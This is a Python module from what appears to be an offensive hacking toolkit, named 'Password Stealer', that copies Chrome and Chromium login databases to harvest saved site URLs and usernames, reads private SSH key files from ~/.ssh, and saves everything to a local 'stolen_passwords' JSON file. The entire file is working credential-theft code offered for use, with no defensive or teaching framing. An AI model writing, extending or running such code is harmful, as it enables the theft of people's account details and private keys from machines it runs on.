#!/usr/bin/env python3
# Password Stealer Module

import os
import json
import sqlite3
import subprocess
from core.colors import Colors
from core.utils import save_json, get_timestamp
from config.settings import DATA_DIR

class PasswordStealer:
    def __init__(self):
        self.name = "Password Stealer"
        self.passwords = []
    
    def steal_chrome(self):
        """Steal Chrome saved passwords"""
        chrome_paths = [
            os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
            os.path.expanduser("~/.config/chromium/Default/Login Data"),
        ]
        
        for db_path in chrome_paths:
            if os.path.exists(db_path):
                temp_db = "/tmp/chrome_login.db"
                os.system(f"cp '{db_path}' {temp_db} 2>/dev/null")
                try:
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value FROM logins")
                    for row in cursor.fetchall():
                        url, username = row
                        if username:
                            self.passwords.append({
                                "type": "Chrome",
                                "url": url,
                                "username": username
                            })
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass
    
    def steal_ssh_keys(self):
        """Steal SSH keys"""
        ssh_dir = os.path.expanduser("~/.ssh")
        if os.path.exists(ssh_dir):
            for key in ['id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519']:
                key_path = os.path.join(ssh_dir, key)
                if os.path.exists(key_path):
                    with open(key_path, 'r') as f:
                        self.passwords.append({
                            "type": "SSH Key",
                            "url": key_path,
                            "username": key,
                            "password": f.read()[:200]
                        })
    
    def run(self):
        print(f"\n{Colors.CYAN}[*] {self.name}{Colors.END}")
        print(f"{Colors.GREEN}[1] Steal Chrome Passwords")
        print(f"{Colors.GREEN}[2] Steal SSH Keys")
        print(f"{Colors.GREEN}[3] Steal All")
        
        choice = input(f"\n{Colors.RED}DUALITY{Colors.WHITE}➤ {Colors.END}")
        
        if choice in ['1', '3']:
            self.steal_chrome()
        if choice in ['2', '3']:
            self.steal_ssh_keys()
        
        if self.passwords:
            filename = f"{DATA_DIR}/stolen_passwords_{get_timestamp()}.json"
            save_json(self.passwords, filename)
            print(f"\n{Colors.GREEN}[+] Found {len(self.passwords)} credentials{Colors.END}")
            print(f"{Colors.GREEN}[+] Saved to {filename}{Colors.END}")
            
            for p in self.passwords[:5]:
                print(f"  {p['type']}: {p['url']} - {p['username']}")
        else:
            print(f"{Colors.YELLOW}[!] No passwords found{Colors.END}")
